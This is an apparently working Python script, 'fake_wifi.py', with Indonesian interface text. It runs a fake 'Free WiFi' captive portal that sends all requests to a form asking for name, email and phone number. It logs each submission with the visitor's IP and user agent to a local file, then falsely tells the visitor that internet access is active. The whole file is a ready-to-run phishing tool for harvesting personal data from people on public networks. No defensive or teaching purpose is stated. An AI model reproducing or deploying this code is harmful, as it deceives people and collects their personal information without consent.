#!/usr/bin/env python3
# fake_wifi.py

import http.server
import socketserver
import urllib.parse
import os
import json
from datetime import datetime

PORT = 8080
LOG_FILE = "logs/logs.txt"
TEMPLATE_FILE = "templates/index.html"

class FakeWiFiHandler(http.server.SimpleHTTPRequestHandler):
    
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            
            try:
                with open(TEMPLATE_FILE, 'r', encoding='utf-8') as f:
                    html = f.read()
            except:
                html = self.get_fallback_html()
            
            self.wfile.write(html.encode('utf-8'))
        else:
            # Redirect semua request ke halaman utama
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
    
    def do_POST(self):
        if self.path == "/":
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            params = urllib.parse.parse_qs(post_data.decode('utf-8'))
            
            # Bersihkan data
            data = {k: v[0] if v else '' for k, v in params.items()}
            data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            data['ip'] = self.client_address[0]
            data['user_agent'] = self.headers.get('User-Agent', 'Unknown')
            
            # Simpan ke logs
            os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(json.dumps(data, ensure_ascii=False) + '\n')
            
            print(f"[📥] Data diterima dari {data['ip']}: {data.get('name', 'N/A')}")
            
            # Respons sukses
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            response = '''
            <html>
            <head><meta charset="UTF-8"></head>
            <body style="text-align:center; font-family:Arial; padding:50px; background:#f0f2f5;">
                <div style="background:white; padding:40px; border-radius:12px; max-width:400px; margin:auto;">
                    <h2 style="color:#1a73e8;">✅ Terima kasih!</h2>
                    <p>Akses internet telah diaktifkan.</p>
                    <p style="font-size:12px; color:gray;">Silakan tutup halaman ini.</p>
                </div>
            </body>
            </html>
            '''
            self.wfile.write(response.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
    
    def get_fallback_html(self):
        return '''
        <html>
        <head><meta charset="UTF-8"></head>
        <body style="font-family:Arial; padding:30px; text-align:center; background:#f0f2f5;">
            <div style="background:white; padding:40px; border-radius:12px; max-width:350px; margin:auto;">
                <h2 style="color:#1a73e8;">🌐 Free WiFi</h2>
                <p>Masukkan data untuk akses internet:</p>
                <form method="POST" action="/">
                    <input type="text" name="name" placeholder="Nama Lengkap" required style="width:100%; padding:10px; margin:8px 0; border:1px solid #ccc; border-radius:6px;">
                    <input type="email" name="email" placeholder="Email" required style="width:100%; padding:10px; margin:8px 0; border:1px solid #ccc; border-radius:6px;">
                    <input type="text" name="phone" placeholder="Nomor HP" required style="width:100%; padding:10px; margin:8px 0; border:1px solid #ccc; border-radius:6px;">
                    <button type="submit" style="background:#1a73e8; color:white; border:none; padding:12px; width:100%; border-radius:6px; font-size:16px; cursor:pointer;">Kirim</button>
                </form>
            </div>
        </body>
        </html>
        '''
    
    def log_message(self, format, *args):
        pass

if __name__ == "__main__":
    print(f"[+] Web server running on port {PORT}")
    with socketserver.TCPServer(("", PORT), FakeWiFiHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[!] Web server stopped.")